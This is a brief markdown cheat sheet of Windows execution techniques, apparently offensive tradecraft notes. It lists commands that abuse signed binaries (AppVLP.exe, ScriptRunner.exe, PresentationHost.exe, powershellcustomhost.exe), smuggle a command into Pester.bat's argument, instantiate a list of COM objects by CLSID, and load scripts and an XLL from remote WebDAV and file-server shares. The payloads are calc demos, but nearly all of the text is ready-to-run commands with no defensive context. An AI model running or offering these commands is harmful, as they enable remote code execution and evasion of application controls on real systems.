# Code Execution...
Generally useless ways to exec code.

## appvlp.exe
```
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe', '', '', 'open', 1)"
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe \\webdav\calc.bat
```

## scriptrunner.exe
```
C:\Windows\System32\ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
C:\Windows\System32\ScriptRunner.exe -appvscript powershell.exe -args
```

## pester.bat
```
C:\Program Files (x86)\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat help  "; Get-Process"
```

##  powershellcustomhost.exe (Likely installed with IIS)
```
C:\Program Files\IIS\Microsoft Web Deploy V3\Scripts\powershellcustomhost.exe calc.ps1
```

## presentationhost.exe 
```
PresentationHost.exe file://c:\windows\system32\calc.exe
```

## COM
```Powershell
$a = [Type]::GetTypeFromCLSID("02BCC737-B171-4746-94C9-0D8A0B2C0089"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("C4D2D8E0-D1DD-11CE-940F-008029004347"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("276FBFC1-D71F-4619-A7C1-0181077EE283"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("0F87369F-A4E5-4CFC-BD3E-73E6154572DD"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("13709620-C279-11CE-A49E-444553540000"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("1D09B407-A97F-378A-ACCB-82CA0082F9F3"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("1F3D8AA5-9EBF-4EE4-85C2-EA40379AEDE8"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("3050F3D9-98B5-11CF-BB82-00AA00BDCE0B"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("32DA2B15-CFED-11D1-B747-00C04FC2B085"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("563DC062-B09A-11D2-A24D-00104BD35090"); $b = [Activator]::CreateInstance($a)
$a = [Type]::GetTypeFromCLSID("7B2801E6-0BC6-4C92-B742-6BE9B01AE874"); $b = [Activator]::CreateInstance($a)
$b | gm (after each)
```
